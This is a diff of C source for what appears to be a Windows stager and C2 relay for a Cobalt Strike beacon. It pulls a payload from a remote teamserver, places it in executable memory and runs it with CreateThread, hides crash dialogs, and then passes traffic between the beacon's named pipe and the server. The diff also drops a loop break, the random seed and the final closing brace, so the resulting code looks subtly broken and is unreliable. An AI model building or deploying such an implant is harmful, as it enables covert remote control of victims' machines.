@@ -202,7 +202,6 @@ DWORD recvData(SOCKET sd, char * buffer, DWORD max) {
 			decoded_value = decode_position(&(random_line[256 * i]));
 			if (decoded_value > 255) {
 				done = 1;
-				break;
 			} else {
 				buffer[total] = (unsigned char) (decoded_value % 256);
 			}
@@ -267,6 +266,7 @@ void write_frame(HANDLE smb_handle, char * buffer, DWORD length) {
 void main(int argc, char* argv[])
 {
 
+
 	// Set connection and IRC info
 	if (argc != 4)
 	{
@@ -275,10 +275,6 @@ void main(int argc, char* argv[])
 		exit(1);
 	}
 
-	//seed random number table
-	time_t time_seed;
-	srand((unsigned int) time(&time_seed));
-	
 	// Disable crash messages
 	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
 	// _set_abort_behavior(0,_WRITE_ABORT_MSG);
@@ -303,45 +299,37 @@ void main(int argc, char* argv[])
 		exit(1);
 	}
 
-	// Allocate data for receiving beacon payload
-
+	// Recv beacon payload
 	char * payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (payload == NULL)
 	{
 		printf("payload buffer malloc failed!\n");
 		exit(1);
 	}
-
-	//Receive initial payload data
-
-	DWORD read_size = recvData(sockfd, payload, BUFFER_MAX_SIZE);
-	if (read_size < 0) 
+	DWORD payload_size = recvData(sockfd, payload, BUFFER_MAX_SIZE);
+	if (payload_size < 0)
 	{
 		printf("recvData error, exiting\n");
 		free(payload);
 		exit(1);
 	}
-
-	printf("Recv %d byte payload from TS\n", read_size);
+	printf("Recv %d byte payload from TS\n", payload_size);
 	/* inject the payload stage into the current process */
-
-	printf("Injecting payload stage into current process.");
 	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);
 	// Loop unstil the pipe is up and ready to use
 	while (beaconPipe == INVALID_HANDLE_VALUE) {
 		// Create our IPC pipe for talking to the C2 beacon
-		Sleep(50);
+		Sleep(500);
 		// 50 (max size of PIPE_STR) + 13 (size of "\\\\.\\pipe\\")
 		char pipestr[50+13]= "\\\\.\\pipe\\";
 		// Pipe str (i.e. "mIRC")
 		strcat(pipestr, pipe_str);
 		// Full string (i.e. "\\\\.\\pipe\\mIRC")
-		// Create pipe to connect to. 
 		beaconPipe = CreateFileA(pipestr, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, (DWORD)NULL, NULL);
 	}
 	printf("Connected to pipe!!\n");
 
-	// Mudge used 1MB max in his example
+	// Mudge used 1MB max in his example, test this
 	char * buffer = (char *)malloc(BUFFER_MAX_SIZE);
 	if (buffer == NULL)
 	{
@@ -350,39 +338,35 @@ void main(int argc, char* argv[])
 		exit(1);
 	}
 
-
-
-	// The pipe dance
 	while (1) {
-
-		// Read frame
+		// Start the pipe dance
 		DWORD read_size = read_frame(beaconPipe, buffer, BUFFER_MAX_SIZE);
 		if (read_size < 0)
 		{
 			printf("read_frame error, exiting\n");
 			break;
 		}
-
-		//Send data to receiver, 1 byte per packet
 		printf("Recv %d bytes from beacon\n", read_size);
+		
 
-
+		sendData(sockfd, buffer, read_size);
 		printf("Sent to TS\n");
 		
-
-		//Read in data from server. 
 		read_size = recvData(sockfd, buffer, BUFFER_MAX_SIZE);
-		
+		if (read_size < 0)
+		{
+			printf("recvData error, exiting\n");
+			break;
+		}
 		printf("Recv %d bytes from TS\n", read_size);
+
 		write_frame(beaconPipe, buffer, read_size);
 		printf("Sent to beacon\n");
 	}
-	//Free all allocated memory and close all memory leaks 
 	free(payload);
 	free(buffer);
 	closesocket(sockfd);
 	CloseHandle(beaconPipe);
 
 	exit(0);
-}
 
